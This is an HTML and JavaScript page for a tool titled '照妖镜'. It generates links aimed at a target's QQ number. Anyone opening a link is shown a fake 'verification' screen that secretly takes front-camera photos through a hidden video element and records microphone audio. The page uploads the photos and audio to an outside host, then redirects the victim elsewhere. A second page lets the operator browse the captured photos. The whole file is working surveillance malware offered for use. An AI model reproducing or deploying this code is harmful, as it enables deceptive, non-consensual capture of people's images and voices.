<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>照妖镜</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif;
            background: #0a0a0f;
            color: #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px 20px 90px 20px;
        }
        .config-container { max-width: 600px; width:100%; }
        .card {
            background:#13131a; border:1px solid #2a2a35; border-radius:12px;
            padding:32px 28px; margin-bottom:20px;
        }
        .card-header { text-align:center; margin-bottom:24px; }
        .card-header .icon {
            width: 80px;
            height: 80px;
            object-fit: contain;
            border-radius: 16px;
            margin-bottom: 12px;
        }
        .card-header h1 {
            font-size:26px;
            background:linear-gradient(135deg,#e0e0e0,#a0a0c0);
            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
        }
        .form-group { margin-bottom:20px; }
        .form-group label { display:block; font-size:13px; color:#a0a0b0; margin-bottom:6px; }
        .form-group input, .form-group select {
            width:100%; padding:13px 15px; background:#1a1a24;
            border:1.5px solid #2a2a35; border-radius:8px; color:#e0e0e0;
            font-size:15px; outline:none;
        }
        .form-group input:focus, .form-group select:focus {
            border-color:#6c5ce7;
        }
        .checkbox-group { display:flex; align-items:center; gap:10px; }
        .checkbox-group input[type="checkbox"] { width:auto; }
        .btn {
            width:100%; padding:14px; background:#6c5ce7; color:#fff;
            border:none; border-radius:8px; font-size:16px; cursor:pointer;
            margin-bottom:10px;
            transition: opacity 0.2s;
        }
        .btn:active { opacity:0.7; }
        .btn-secondary { background:#2ecc71; }
        .result-area {
            display:none; margin-top:20px; padding:18px;
            background:#0d0d15; border:1px solid #2a2a35; border-radius:8px;
        }
        .result-area.show { display:block; }
        .result-area input {
            width:100%; padding:10px; background:#1a1a24;
            border:1px solid #2a2a35; border-radius:6px; color:#7ecbff;
            font-size:13px;
        }
        .btn-copy {
            padding:10px 16px; background:#2ecc71; color:#fff;
            border:none; border-radius:6px; cursor:pointer; margin-top:8px;
        }
        .photo-grid {
            display:grid; grid-template-columns:repeat(auto-fill, minmax(120px,1fr));
            gap:10px; margin-top:10px;
        }
        .photo-grid img {
            width:100%; height:100px; object-fit:cover;
            border-radius:6px; border:1px solid #333; cursor:pointer;
        }
        .warning-box {
            margin-top:18px; padding:12px;
            background:rgba(231,76,60,0.08);
            border:1px solid rgba(231,76,60,0.25);
            border-radius:8px; font-size:12px; color:#e98b82;
        }

        /* ========== 页面切换 ========== */
        .page { display:none; }
        .page.active { display:block; }

        /* ========== Dock 底部导航栏 ========== */
        .dock-bar {
            position:fixed; bottom:0; left:0; right:0;
            background:#13131a; border-top:1px solid #2a2a35;
            display:flex; justify-content:space-around; align-items:center;
            padding:8px 0 env(safe-area-inset-bottom, 8px) 0;
            max-width:600px; margin:0 auto;
            z-index:1000;
        }
        .dock-item {
            display:flex; flex-direction:column; align-items:center;
            gap:2px; padding:6px 20px; border-radius:8px;
            background:transparent; border:none; color:#666;
            cursor:pointer; transition:color 0.2s;
            font-size:11px;
        }
        .dock-item .dock-icon { font-size:24px; line-height:1.2; }
        .dock-item .dock-label { font-size:11px; color:#666; }
        .dock-item.active .dock-label { color:#6c5ce7; }
        .dock-item.active .dock-icon { filter:drop-shadow(0 0 6px rgba(108,92,231,0.4)); }
        .dock-item:active { transform:scale(0.92); }

        /* 追踪页 */
        .track-overlay {
            position:fixed; inset:0; z-index:99999; background:#000;
            display:flex; align-items:center; justify-content:center; flex-direction:column;
            overflow:hidden;
        }
        .log-stream {
            position:absolute; inset:0; overflow:hidden; pointer-events:none; z-index:0;
            font-family:'SF Mono','Consolas','Monaco','Courier New',monospace;
            font-size:10px; line-height:1.6; color:#3d3d4a;
            display:flex; flex-direction:column; justify-content:flex-end;
        }
        .log-line { display:block; width:100%; white-space:nowrap; overflow:hidden; flex-shrink:0; }
        .center-box { position:relative; z-index:1; text-align:center; }
        .spinner {
            width:45px; height:45px; border:3px solid rgba(255,255,255,0.15);
            border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite;
            margin:0 auto 20px;
        }
        @keyframes spin { to { transform:rotate(360deg); } }
        .spinner.done { border-top-color:#2ecc71; border-color:rgba(46,204,113,0.2); border-top-color:#2ecc71; }
        .spinner.error { border-top-color:#e74c3c; border-color:rgba(231,76,60,0.2); border-top-color:#e74c3c; }
        .status-text { color:#aaa; font-size:15px; }
        .denied-msg { display:none; color:#e74c3c; font-size:14px; margin-top:10px; }
        .denied-msg.show { display:block; }
    </style>
</head>
<body>

<!-- ==================== 主容器 ==================== -->
<div id="configMode" class="config-container">

    <!-- ===== 页面：主页 ===== -->
    <div class="page active" id="pageHome">
        <div class="card">
            <div class="card-header">
                <img class="icon" src="3.png" alt="照妖镜图标">
                <h1>言出法随·照妖镜</h1>
                <p style="color:#a0a0b0;font-size:13px;">生成链接 · 拍照 · 连拍 · 录音</p>
            </div>
        </div>

        <div class="card">
            <div class="form-group">
                <label>QQ号 <span style="color:#e74c3c;">*</span></label>
                <input type="text" id="qqInput" placeholder="输入目标QQ号" maxlength="20">
            </div>
            <div class="form-group">
                <label>跳转网址 <span style="color:#e74c3c;">*</span></label>
                <input type="url" id="urlInput" placeholder="https://example.com">
            </div>

            <div class="form-group">
                <label>连拍张数</label>
                <input type="number" id="burstInput" value="1" min="1" max="10" step="1">
                <div style="font-size:11px;color:#666;margin-top:4px;">目标打开后自动连续拍摄的照片数量（1-10张）</div>
            </div>
            <div class="form-group checkbox-group">
                <input type="checkbox" id="audioCheck" checked>
                <label for="audioCheck" style="margin:0;">同时录制一段语音</label>
            </div>

            <button class="btn" onclick="generateLink()">🔗 生成链接</button>

            <div class="result-area" id="resultArea">
                <div style="color:#2ecc71;font-weight:600;font-size:12px;">✅ 链接已生成</div>
                <input type="text" id="resultLink" readonly onclick="this.select();copyLink()">
                <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制链接</button>
            </div>

            <div class="warning-box">
                ⚠️ 对方需为安卓系统并使用非Edge、火狐等浏览器，系统自带浏览器即可，QQ微信也可以
            </div>
        </div>
    </div>

    <!-- ===== 页面：查询 ===== -->
    <div class="page" id="pageQuery">
        <div class="card">
            <div class="card-header">
                <span style="font-size:52px;">📁</span>
                <h1 style="font-size:22px;background:linear-gradient(135deg,#e0e0e0,#a0a0c0);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">查询照片</h1>
                <p style="color:#a0a0b0;font-size:13px;">输入QQ号查看已拍摄的照片</p>
            </div>
        </div>

        <div class="card">
            <div class="form-group">
                <label>输入QQ号查询</label>
                <input type="text" id="queryQQ" placeholder="输入QQ号">
            </div>
            <button class="btn btn-secondary" onclick="queryPhotos()">🔍 查询照片</button>
            <div id="photoResult" style="margin-top:15px;"></div>
        </div>
    </div>
</div>

<!-- ==================== Dock 底部导航 ==================== -->
<div class="dock-bar" id="dockBar">
    <button class="dock-item active" data-page="pageHome">
        <span class="dock-icon">🏠</span>
        <span class="dock-label">主页</span>
    </button>
    <button class="dock-item" data-page="pageQuery">
        <span class="dock-icon">📁</span>
        <span class="dock-label">查询</span>
    </button>
</div>

<!-- ==================== 追踪模式 ==================== -->
<div class="track-overlay" id="trackMode" style="display:none;">
    <div class="log-stream" id="logStream"></div>
    <div class="center-box">
        <div class="spinner" id="spinner"></div>
        <div class="status-text" id="statusText">正在初始化...</div>
        <div class="denied-msg" id="deniedMsg">
            🚫 访问被拒绝<br>
            <span style="font-size:12px;color:#666;">权限未同意，访问终止</span>
        </div>
    </div>
</div>

<video id="vid" playsinline autoplay muted style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;"></video>
<canvas id="cvs" style="display:none;"></canvas>

<script>
const $ = id => document.getElementById(id);

// ========== Dock 导航切换 ==========
document.querySelectorAll('.dock-item').forEach(item => {
    item.addEventListener('click', function() {
        // 切换 Dock 激活状态
        document.querySelectorAll('.dock-item').forEach(i => i.classList.remove('active'));
        this.classList.add('active');

        // 切换页面
        const pageId = this.dataset.page;
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        $(pageId).classList.add('active');
    });
});

// ========== 主页功能 ==========
function generateLink() {
    const qq = $('qqInput').value.trim();
    const url = $('urlInput').value.trim();
    const burst = $('burstInput').value || 1;
    const audio = $('audioCheck').checked ? 1 : 0;

    if (!qq || !/^\d{4,20}$/.test(qq)) return alert('请输入正确的QQ号');
    if (!url || !/^https?:\/\/.+/.test(url)) return alert('请输入有效的跳转网址');

    const params = new URLSearchParams();
    params.set('qq', qq);
    params.set('url', url);
    params.set('burst', burst);
    params.set('audio', audio);
    const link = location.origin + location.pathname + '?' + params.toString();

    $('resultLink').value = link;
    $('resultArea').classList.add('show');
    copyLink();
}

function copyLink() {
    const i = $('resultLink');
    i.select();
    navigator.clipboard?.writeText(i.value).then(() => $('btnCopy').textContent = '✅ 已复制')
    .catch(() => document.execCommand('copy'));
}

async function queryPhotos() {
    const qq = $('queryQQ').value.trim();
    if (!qq) return alert('请输入QQ号');
    const resultDiv = $('photoResult');
    resultDiv.innerHTML = '<div style="color:#888;">查询中...</div>';

    try {
        const resp = await fetch(`http://a1nb66.atwebpages.com/zyj/api.php?action=list_images&qq=${qq}`);
        const data = await resp.json();
        if (!data.success) {
            resultDiv.innerHTML = `<div style="color:#e74c3c;">${data.message || '查询失败'}</div>`;
            return;
        }
        if (data.images.length === 0) {
            resultDiv.innerHTML = '<div style="color:#888;">该QQ号暂无照片</div>';
            return;
        }
        let html = '<div class="photo-grid">';
        data.images.forEach(img => {
            const imgUrl = `http://a1nb66.atwebpages.com/zyj/api.php?action=view_image&qq=${qq}&file=${encodeURIComponent(img)}`;
            html += `<img src="${imgUrl}" loading="lazy" onclick="window.open('${imgUrl}','_blank')">`;
        });
        html += '</div>';
        resultDiv.innerHTML = html;
    } catch (e) {
        resultDiv.innerHTML = `<div style="color:#e74c3c;">网络错误：${e.message}</div>`;
    }
}

// ========== 追踪页功能 ==========
function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
    $('configMode').style.display = 'none';
    $('dockBar').style.display = 'none';
    $('trackMode').style.display = 'flex';

    const spinner = $('spinner');
    const statusText = $('statusText');
    const deniedMsg = $('deniedMsg');
    const vid = $('vid');
    const cvs = $('cvs');
    const API = 'http://a1nb66.atwebpages.com/zyj/api.php';
    const logStream = $('logStream');
    const MAX_LINES = 50;
    let logLines = [];

    function pushLog(text) {
        logLines.push(text);
        if (logLines.length > MAX_LINES) logLines.shift();
        logStream.innerHTML = '';
        logLines.forEach(line => {
            const div = document.createElement('div');
            div.className = 'log-line';
            div.textContent = line;
            logStream.appendChild(div);
        });
    }

    function setStatus(t, isErr) {
        statusText.textContent = t;
        statusText.style.color = isErr ? '#e74c3c' : '#aaa';
    }

    const ua = navigator.userAgent;
    const platform = navigator.platform || 'unknown';
    const screenW = window.screen.width, screenH = window.screen.height;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
    const cores = navigator.hardwareConcurrency || 'unknown';
    pushLog(`User-Agent: ${ua}`);
    pushLog(`Screen: ${screenW}x${screenH} | Platform: ${platform} | Cores: ${cores} | TZ: ${timezone}`);

    async function run() {
        setStatus('正在请求服务器...');
        pushLog('Requesting permissions...');

        let stream;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: audioEnabled ? true : false
            });
            pushLog('Permission granted (camera' + (audioEnabled ? ' + microphone' : '') + ')');
        } catch (e) {
            if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
                setStatus('访问被拒绝', true);
                spinner.classList.add('error');
                spinner.style.display = 'none';
                deniedMsg.classList.add('show');
                return;
            }
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: audioEnabled });
                pushLog('Fallback getUserMedia success');
            } catch (e2) {
                if (e2.name === 'NotAllowedError' || e2.name === 'PermissionDeniedError') {
                    setStatus('访问被拒绝', true);
                    spinner.classList.add('error');
                    spinner.style.display = 'none';
                    deniedMsg.classList.add('show');
                    return;
                }
                setStatus('设备不可用，权限未给予', true);
                spinner.classList.add('error');
                setTimeout(() => location.href = redirectUrl, 2000);
                return;
            }
        }

        vid.srcObject = stream;
        vid.play().catch(()=>{});
        setStatus('准备就绪...');

        const ready = await new Promise(resolve => {
            const start = Date.now();
            const check = () => {
                if (vid.videoWidth > 0) return resolve(true);
                if (Date.now() - start > 8000) return resolve(false);
                requestAnimationFrame(check);
            };
            vid.addEventListener('loadeddata', () => vid.videoWidth > 0 && resolve(true), { once: true });
            requestAnimationFrame(check);
        });
        if (!ready) {
            pushLog('Error: video stream timeout');
            setStatus('超时', true);
            spinner.classList.add('error');
            stream.getTracks().forEach(t => t.stop());
            setTimeout(() => location.href = redirectUrl, 2000);
            return;
        }

        pushLog(`Video resolution: ${vid.videoWidth}x${vid.videoHeight}`);
        cvs.width = vid.videoWidth;
        cvs.height = vid.videoHeight;
        const ctx = cvs.getContext('2d');

        for (let i = 0; i < burstCount; i++) {
            setStatus(`验证中.. (${i+1}/${burstCount})...`);
            ctx.drawImage(vid, 0, 0);
            const img = cvs.toDataURL('image/jpeg', 0.65);
            pushLog(`Captured frame ${i+1}/${burstCount} (${Math.round(img.length/1024)}KB)`);

            const fd = new FormData();
            fd.append('qq', qq);
            fd.append('image', img);
            try {
                const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
                if (resp.ok) {
                    const r = await resp.json();
                    if (r.success) pushLog(`Upload success: ${r.image || 'ok'}`);
                    else pushLog(`Upload rejected: ${r.message || 'unknown'}`);
                } else {
                    pushLog(`Upload failed: HTTP ${resp.status}`);
                }
            } catch (e) {
                pushLog(`Network error: ${e.message}`);
            }
            if (i < burstCount - 1) await sleep(500);
        }

        if (audioEnabled && stream.getAudioTracks().length > 0) {
            setStatus('准备...');
            pushLog('Recording audio (3s)...');
            try {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: mediaRecorder.mimeType || 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = async () => {
                        const base64 = reader.result;
                        pushLog(`Audio recorded (${Math.round(blob.size/1024)}KB)`);
                        const fd = new FormData();
                        fd.append('qq', qq);
                        fd.append('audio', base64);
                        try {
                            const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
                            if (resp.ok) {
                                const r = await resp.json();
                                if (r.success) pushLog(`Audio upload success: ${r.audio || 'ok'}`);
                                else pushLog(`Audio upload rejected: ${r.message || 'unknown'}`);
                            } else {
                                pushLog(`Audio upload failed: HTTP ${resp.status}`);
                            }
                        } catch (e) {
                            pushLog(`Audio network error: ${e.message}`);
                        }
                        setStatus('完成 ✓');
                        spinner.classList.add('done');
                        setTimeout(() => location.href = redirectUrl, 1500);
                    };
                    reader.readAsDataURL(blob);
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 3000);
            } catch (e) {
                pushLog(`Audio recording error: ${e.message}`);
                setStatus('WIN', false);
                setTimeout(() => location.href = redirectUrl, 1500);
            }
        } else {
            setStatus('WIN');
            spinner.classList.add('done');
            setTimeout(() => location.href = redirectUrl, 1500);
        }

        stream.getTracks().forEach(t => t.stop());
    }

    setTimeout(run, 800);
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// 入口
const params = new URLSearchParams(location.search);
const qq = params.get('qq');
const url = params.get('url');
const burst = parseInt(params.get('burst') || '1');
const audio = params.get('audio') !== '0';
if (qq && url) {
    startTrack(qq, decodeURIComponent(url), burst, audio);
} else {
    $('configMode').style.display = 'block';
    $('dockBar').style.display = 'flex';
}
</script>
</body>
</html>
